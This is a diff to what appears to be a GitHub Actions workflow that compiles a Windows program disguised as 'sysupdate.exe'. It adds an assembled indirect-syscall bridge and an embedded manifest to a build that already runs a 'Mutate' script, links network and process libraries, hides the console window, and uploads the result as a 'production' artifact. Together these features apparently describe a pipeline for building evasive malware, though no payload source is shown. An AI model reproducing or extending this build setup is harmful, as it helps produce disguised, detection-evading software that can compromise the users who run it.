@@ -6,18 +6,38 @@ jobs:
     runs-on: windows-latest
     steps:
     - uses: actions/checkout@v4
+
     - uses: actions/setup-python@v5
       with:
         python-version: '3.x'
+
     - name: Mutate
       run: python mutate.py
+
     - name: Build
       shell: cmd
       run: |
+        :: 1. Setup the 64-bit compiler environment
         call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
+
+        :: 2. Compile the resources (Metadata + Icon + Manifest Link)
         rc.exe resources.rc
-        cl.exe /O2 /MT /EHsc /DNDEBUG main.cpp resources.res /link /SUBSYSTEM:WINDOWS /OUT:sysupdate.exe user32.lib kernel32.lib winhttp.lib advapi32.lib psapi.lib
-    - uses: actions/upload-artifact@v4
+
+        :: 3. Assemble the Indirect Syscall bridge
+        ml64.exe /c syscalls.asm
+
+        :: 4. Compile and Link everything
+        :: /MANIFEST:EMBED ensures the 'asInvoker' setting is locked in
+        :: syscalls.obj is added so the bridge functions are found
+        cl.exe /O2 /MT /EHsc /DNDEBUG ^
+        main.cpp syscalls.obj resources.res ^
+        /link /SUBSYSTEM:WINDOWS ^
+        /MANIFEST:EMBED /MANIFESTINPUT:app.manifest ^
+        /OUT:sysupdate.exe ^
+        user32.lib kernel32.lib winhttp.lib advapi32.lib psapi.lib shell32.lib
+
+    - name: Upload Production Build
+      uses: actions/upload-artifact@v4
       with:
         name: system-build-production
         path: sysupdate.exe
